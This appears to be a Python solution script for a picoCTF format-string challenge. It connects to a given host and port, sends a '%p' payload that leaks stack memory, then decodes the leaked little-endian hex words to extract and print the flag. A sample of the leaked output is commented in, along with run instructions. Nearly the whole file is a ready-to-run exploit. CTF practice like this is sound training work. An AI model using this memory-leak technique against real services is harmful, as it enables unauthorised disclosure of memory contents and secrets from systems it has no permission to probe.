import argparse
import socket
from binascii import unhexlify
import re

parser = argparse.ArgumentParser()

parser.add_argument("--target", "-t", type=str)
parser.add_argument("--port", "-p", type=int)
args = parser.parse_args()

offset = 20

#payload = b"1\n"
#rytmus = b"%p__" * 20 + b"\n"
payload = b"".join(
        [
            b"1\n",
            b"%p__"  * 40,
            b"\n",
        ]
)


with socket.socket() as connection:
    
    connection.connect((args.target, args.port))
    connection.recv(4096).decode("utf-8")
    connection.recv(4096).decode("utf-8")
    connection.send(payload)
    connection.recv(4096).decode("utf-8")
    a = connection.recv(4096).decode("utf-8")
    

#print("-----------------------------------------------"*2)
a = a.split("\n")
for i in a:
    if i[0:2] == '0x':
        a = i
    else:
        pass

a = a.replace("__", " ")
a = a.replace("0x", "")
a = a.split(" ")

    
#print(a)
new = []
for i in a:
    if len(i) > 7:
        new.append(i)


#   THIS IS THE OUTPUT  ['f7eecd80', 'ffffffff', 'f7efa110', 'f7eecdc7', '6f636970', '7b465443', '306c5f49', '345f7435', '6d5f6c6c', '306d5f79', '5f79336e', '62633763', '65616336', 'ffc4007d', 'f7f27af8', 'f7efa440', '7e48a500', 'f7d89ce9', 'f7efb0c0', 'f7eec5c0', 'f7eec000', 'ffc4c448', 'f7d7a68d', 'f7eec5c0', 'ffc4c454', 'f7f0ef09']
#for i in a:
#print(new)

def separate(lest):
    new_list = []
    for i in lest:
        for j in reversed(range(len(i))):
            if j % 2 == 1:
                new_list.append(i[j-1:j+1])
    return new_list

new = separate(new)

def decoder(lest):
    a = ""
    for i in new:
        try:
            a += (unhexlify(i).decode())
        except:
            pass
    return a

new = decoder(new)
pattern = re.compile(r"[picoCTF{].*[}]")
match = pattern.search(new)
print(match.group(0))

#SIMPLY PUT IN YOUR TERMINAL THE FOLLOWING COMMAND - "python3 (name_of_the_file).py -t (IP) -p (PORT)" AND WAIT FOR THE FLAG TO BE RETURNED
